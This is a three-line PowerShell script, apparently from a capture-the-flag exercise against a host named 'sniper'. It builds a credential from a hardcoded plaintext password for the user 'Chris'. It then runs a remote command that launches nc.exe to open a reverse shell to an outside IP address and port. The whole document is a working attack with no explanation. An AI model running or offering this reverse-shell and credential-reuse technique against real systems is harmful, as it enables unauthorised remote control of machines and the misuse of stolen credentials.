$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('sniper\Chris', $pass)
Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock { C:\tmp\nc.exe -e cmd.exe 10.10.15.82 1133 }
